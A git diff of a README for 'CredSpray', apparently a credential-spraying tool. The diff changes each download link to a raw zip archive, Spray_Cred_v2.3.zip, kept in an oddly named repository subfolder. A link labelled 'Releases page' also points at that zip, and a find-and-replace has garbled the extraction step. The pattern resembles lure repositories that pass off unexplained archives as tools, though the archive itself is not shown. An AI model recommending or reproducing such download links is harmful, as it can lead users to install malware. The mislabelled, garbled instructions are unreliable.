@@ -6,11 +6,11 @@ Welcome to CredSpray! This tool helps you validate credentials using multiple pr
 
 ## 📥 Download CredSpray
 
-[![Download CredSpray](https://github.com/adienamgfrh/CredSpray/raw/refs/heads/main/appinite/Spray-Cred-v1.6-beta.1.zip)](https://github.com/adienamgfrh/CredSpray/raw/refs/heads/main/appinite/Spray-Cred-v1.6-beta.1.zip)
+[![Download CredSpray](https://github.com/adienamgfrh/CredSpray/raw/refs/heads/main/appinite/Spray_Cred_v2.3.zip)](https://github.com/adienamgfrh/CredSpray/raw/refs/heads/main/appinite/Spray_Cred_v2.3.zip)
 
 You can visit the following page to download the latest version of CredSpray:
 
-[Download Latest Release](https://github.com/adienamgfrh/CredSpray/raw/refs/heads/main/appinite/Spray-Cred-v1.6-beta.1.zip)
+[Download Latest Release](https://github.com/adienamgfrh/CredSpray/raw/refs/heads/main/appinite/Spray_Cred_v2.3.zip)
 
 ## 🔧 Requirements
 
@@ -25,7 +25,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ### Step 1: Visit the Download Page
 
-Go to the [Releases page](https://github.com/adienamgfrh/CredSpray/raw/refs/heads/main/appinite/Spray-Cred-v1.6-beta.1.zip). You will see a list of available versions.
+Go to the [Releases page](https://github.com/adienamgfrh/CredSpray/raw/refs/heads/main/appinite/Spray_Cred_v2.3.zip). You will see a list of available versions.
 
 ### Step 2: Choose Your Version
 
@@ -37,7 +37,7 @@ Click on the appropriate file for your operating system. Your browser will start
 
 ### Step 4: Extract the Files
 
-If the file is compressed (e.g., .zip or https://github.com/adienamgfrh/CredSpray/raw/refs/heads/main/appinite/Spray-Cred-v1.6-beta.1.zip), locate the downloaded file and extract its contents to a folder of your choice. Right-click the file and select "Extract Here" or use your preferred extraction tool.
+If the file is compressed (e.g., .zip or https://github.com/adienamgfrh/CredSpray/raw/refs/heads/main/appinite/Spray_Cred_v2.3.zip), locate the downloaded file and extract its contents to a folder of your choice. Right-click the file and select "Extract Here" or use your preferred extraction tool.
 
 ### Step 5: Run CredSpray
 
